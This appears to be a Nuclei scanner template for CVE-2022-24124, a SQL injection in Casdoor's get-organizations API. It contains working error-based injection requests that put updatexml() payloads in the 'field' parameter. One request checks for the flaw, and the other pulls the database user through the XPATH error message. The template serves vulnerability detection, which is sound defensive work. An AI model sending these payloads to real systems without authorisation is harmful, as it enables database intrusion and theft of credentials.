id: cve-2022-24124

info:
  name: Casdoor v1.13 get-organizations API SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Casdoor before version 1.13.1 is vulnerable to a SQL injection vulnerability in the `api/get-organizations` endpoint. Exploitation allows attackers to retrieve sensitive information, such as database users and passwords.
  reference:
    - https://github.com/casdoor/casdoor/pull/442
    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-2707

variables:
  cmd: "user()"

http:
  - raw:
      - |
        GET /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,md5(333),1) HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "dcbbf4cce62f762a2aaa148d556bd"

  - raw:
      - |
        GET /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,{{cmd}},1) HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: extracted_error
        internal: true
        regex:
          - "XPATH syntax error: &#39;(.*?)&#39;"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "&#39;"

    stop-at-first-match: true
